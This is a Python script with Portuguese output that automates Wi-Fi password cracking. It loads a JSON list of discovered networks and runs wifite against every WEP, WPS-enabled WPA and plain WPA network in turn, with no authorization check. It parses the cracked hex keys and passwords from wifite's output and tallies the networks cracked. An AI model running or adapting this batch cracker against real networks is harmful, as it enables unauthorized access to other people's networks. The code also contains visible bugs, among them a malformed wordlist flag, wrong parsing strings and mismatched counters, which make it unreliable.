#!/usr/bin/python3

import os
import sys
import re
import subprocess
from subprocess import Popen
import json
import time
from printer import dialog
from printer import show_wep_menu
from printer import show_wpa_menu
from printer import show_wpa_wps_menu

CURRENT_PATH = os.getcwd()

def start(database_file='networks.json', kill=False, wordlist=None):
    dialog('== Iniciando ataques ==', color='p')    

    database = __loaddb(database_file)["array"]
    del database[0]

    attack(database[:], kill=kill, wordlist=wordlist)


def __loaddb(file_name):
    file_path = os.path.join( CURRENT_PATH, file_name )
    db = {}

    dialog('Carregando redes para a base de dados...', color='c')
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            db = json.load(file)
    else:
        raise FileNotFoundError("[*] Erro Fatal: arquivo "+file_name+" não encontrado")

    dialog('Base de dados carregada', color='c')
    return db


def attack(networks, kill=False, wordlist=None):
    analized_wep_networks_counter = 0
    analized_wpa_with_wps_networks_counter = 0
    analized_wpa_without_wps_networks_counter = 0

    cracked_wep_networks_counter = 0
    cracked_wpa_with_wps_networks_counter = 0
    cracked_wpa_without_wps_networks_counter = 0
    
    for net in networks:
        try:
            if net["privacity"] == 'WEP':
                analized_wep_networks_counter += 1
                
                print()
                dialog('=== INICIANDO ATAQUE À REDE WEP ===', color='c', style='bold')
                
                dialog(f'Nome: {net["essid"]}', color='orange')
                dialog(f'Endereço MAC: {net["bssid"]}', color='orange')
                dialog(f'WPS: {net["wps"]}', color='orange')
                
                show_wep_menu()

                start_time = time.time()
                hex_key =__wep_attack(net, kill=kill, wordlist=None)[2]
                net["hex_key"] = hex_key

                final_time = time.time()

                total_time = final_time - start_time
                
                if total_time <= 3600 and total_time > 60:
                    minutes = time.gmtime(total_time)[4]
                    seconds = time.gmtime(total_time)[5]

                    dialog(f'Duração do ataque: {minutes}:{seconds} segundos', color='orange')
                elif total_time <= 216000 and total_time > 3600:
                    hour = time.gmtime(total_time)[3]
                    minutes = time.gmtime(total_time)[4]
                    seconds = time.gmtime(total_time)[5]
                    
                    dialog(f'Duração do ataque: {hour}:{minutes}:{seconds} segundos', color='orange')
                else:
                    dialog(f'Duração do ataque: {total_time} segundos', color='orange')
                
                if hex_key != '':
                    cracked_wep_networks_counter += 1
        except KeyboardInterrupt as e:
            dialog('Pulando para o próximo alvo!', color='o')
            continue
    if analized_wep_networks_counter > 0:
        dialog(f'Redes WEP analizadas: {analized_wep_networks_counter}', color='cian')
        dialog(f'Redes WEP crackeadas: {cracked_wep_networks_counter}', color='cian')

    for net in networks:
        try:
            if net["privacity"] == 'WPA' or net["privacity"] == 'WPA2' or net["privacity"] == 'WPA2 WPA':
                if net["wps"] != 'Locke' and net["wps"] != 'Unknown':
                    analized_wpa_with_wps_networks_counter += 1
                    
                    print()
                    dialog('=== INICIANDO ATAQUE À REDE WPA COM WPS ===', color='b', style='bold')

                    dialog(f'Nome: {net["essid"]}', color='orange')
                    dialog(f'Endereço MAC: {net["bssid"]}', color='orange')
                    dialog(f'WPS: {net["wps"]}', color='orange')
                    
                    show_wpa_wps_menu()

                    start_time = time.time()
                    password = __wpa_wps_attack(net, kill=kill, wordlist=None)[2]
                    final_time = time.time()

                    total_time = final_time - start_time
                    
                    if total_time <= 3600 and total_time > 60:
                        minutes = time.gmtime(total_time)[4]
                        seconds = time.gmtime(total_time)[5]

                        dialog(f'Duração do ataque: {minutes}:{seconds} segundos', color='orange')
                    elif total_time <= 216000 and total_time > 3600:
                        hour = time.gmtime(total_time)[3]
                        minutes = time.gmtime(total_time)[4]
                        seconds = time.gmtime(total_time)[5]
                        
                        dialog(f'Duração do ataque: {hour}:{minutes}:{seconds} segundos', color='orange')
                    else:
                        dialog(f'Duração do ataque: {total_time} segundos', color='orange')

                    if password != '':
                        cracked_wpa_with_wps_networks_counter += 1
        except KeyboardInterrupt as e:
            dialog('Pulando para o próximo alvo!', color='o')
            continue
    if analized_wpa_with_wps_networks_counter > 0:
        dialog(f'Redes WPA com WPS analizadas: {analized_wpa_with_wps_networks_counter}', color='cian')
        dialog(f'Redes WPA com WPS crackeadas: {cracked_wpa_without_wps_networks_counter}', color='cian')

    for net in networks:
        try:
            if net["privacity"] == 'WPA' or net["privacity"] == 'WPA2' or net["privacity"] == 'WPA2 WPA':
                if net["wps"] == 'Locke' or net["wps"] == 'Unknown':
                    analized_wpa_without_wps_networks_counter += 1
                    
                    print()
                    dialog('=== INICIANDO ATAQUE À REDE WPA ===', color='o', style='bold')

                    dialog(f'Nome: {net["essid"]}', color='orange')
                    dialog(f'Endereço MAC: {net["bssid"]}', color='orange')
                    dialog(f'WPS: {net["wps"]}', color='orange')
                    
                    show_wpa_menu()

                    start_time = time.time()
                    password = __wpa_attack(net, kill=kill, wordlist=None)[2]
                    final_time = time.time()

                    total_time = final_time - start_time

                    if total_time <= 3600 and total_time > 60:
                        minutes = time.gmtime(total_time)[4]
                        seconds = time.gmtime(total_time)[5]

                        dialog(f'Duração do ataque: {minutes}:{seconds} segundos', color='orange')
                    elif total_time <= 216000 and total_time > 3600:
                        hour = time.gmtime(total_time)[3]
                        minutes = time.gmtime(total_time)[4]
                        seconds = time.gmtime(total_time)[5]
                        
                        dialog(f'Duração do ataque: {hour}:{minutes}:{seconds} segundos', color='orange')
                    else:
                        dialog(f'Duração do ataque: {total_time} segundos', color='orange')

                    if password != '':
                        cracked_wpa_without_wps_networks_counter += 1
        except KeyboardInterrupt as e:
            dialog('Pulando para o próximo alvo!', color='o')
            continue
    if analized_wpa_without_wps_networks_counter > 0:
        dialog(f'Redes WPA sem WPS analizadas: {analized_wpa_with_wps_networks_counter}', color='cian')
        dialog(f'Redes WPA sem WPS crackeadas: {cracked_wpa_without_wps_networks_counter}', color='cian')

    print('\n\n')
    dialog(f'Redes WEP analizadas: {analized_wep_networks_counter}', color='cian')
    dialog(f'Redes WEP crackeadas: {cracked_wep_networks_counter}', color='cian')
    dialog(f'Redes WPA com WPS analizadas: {analized_wpa_with_wps_networks_counter}', color='cian')
    dialog(f'Redes WPA com WPS crackeadas: {cracked_wpa_with_wps_networks_counter}', color='cian')
    dialog(f'Redes WPA sem WPS analizadas: {analized_wpa_without_wps_networks_counter}', color='cian')
    dialog(f'Redes WPA sem WPS crackeadas: {cracked_wpa_without_wps_networks_counter}', color='cian')


def __wep_attack(net, kill=False, wordlist=None):
    if kill:
        if wordlist is not None:
            wifite = Popen(['wifite', '-w', wordlist, '--kill', '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)    
        else:
            wifite = Popen(['wifite', '--kill', '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    elif wordlist is not None:
        wifite = Popen(['wifite', '-w', wordlist, '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)    
    else:
        wifite = Popen(['wifite', '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    
    essid = ''
    bssid = ''
    hex_key = ''

    try:
        for line in iter(wifite.stdout.readline, ''):
            line = line.strip()
            if not line or line == '':
                continue
            print(line)
            sys.stdout.flush()

            if 'ESSID: ' in line:
                essid = line.split('ESSID: ')[1]
            if 'BSSID: ' in line:
                bssid = line.split('BSSID: ')[1]
            if 'Hex Key: ' in line:
                hex_key = line.split('Hex Key: ')[1]

    except KeyboardInterrupt as e:
        wifite.terminate()
    
    return essid, bssid, hex_key
    #print('='*30)
    #print('ESSID:', essid)
    #print('BSSID:', bssid)
    #print('Hex Key:', hex_key)
    #print('='*30)

    '''
    final_line = ''
    try:
        while True:
            output = wifite.stdout.readline()
            if output.decode() == '':
                # end of stream
                print("End of Stream")
                break
            if output is not None:
                # here you could do whatever you want with the output.
                final_line = output
                print(output.decode())
    except KeyboardInterrupt as e:
        wifite.kill()
    
    airmon = Popen(['airmon-ng', 'stop', 'wlan0mon'])
    airmon.terminate()
    '''


def __wpa_wps_attack(net, kill=False, wordlist=None):
    if kill:
        if wordlist is not None:
            wifite = Popen(['wifite', 'w', wordlist, '--kill', '-wps', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
        else:
            wifite = Popen(['wifite', '--kill', '-wps', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    elif wordlist is not None:
        wifite = Popen(['wifite', 'w', wordlist, '-wps', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    else:
        wifite = Popen(['wifite', '-wps', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    
    essid = ''
    bssid = ''
    password = ''

    try:
        for line in iter(wifite.stdout.readline, ''):
            line = line.strip()
            if not line or line == '':
                continue
            print(line)
            sys.stdout.flush()

            if 'Access Point Name: ' in line:
                essid = line.split('Access Point Name: ')[1]
            if 'Access Point BSSID: ' in line:
                bssid = line.split('Access Point BSSID: ')[1]
            if '(password): ' in line:
                password = line.split('(password): ')[1]

    except KeyboardInterrupt as e:
        wifite.terminate()
    
    return essid, bssid, password


def __wpa_attack(net, kill=False, wordlist=None):
    if kill:
        if wordlist is not None:
            wifite = Popen(['wifite', 'w', wordlist,'--kill', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
        else:
            wifite = Popen(['wifite', '--kill', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    elif wordlist is not None:
        wifite = Popen(['wifite', 'w', wordlist, '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    else:
        wifite = Popen(['wifite', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    
    essid = ''
    bssid = ''
    password = ''

    try:
        for line in iter(wifite.stdout.readline, ''):
            line = line.strip()
            if not line or line == '':
                continue
            print(line)
            sys.stdout.flush()

            if 'Access Point Name: ' in line:
                essid = line.split('ESSID: ')[1]
            if 'Access Point BSSID: ' in line:
                bssid = line.split('Access Point Name: ')[1]
            if '(password): ' in line:
                password = line.split('(password): ')[1]

    except KeyboardInterrupt as e:
        wifite.terminate()
    
    return essid, bssid, password


def cleanANSIcodes(text):
    ansi_remover = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    realtext = ansi_remover.sub('', text)
    return realtext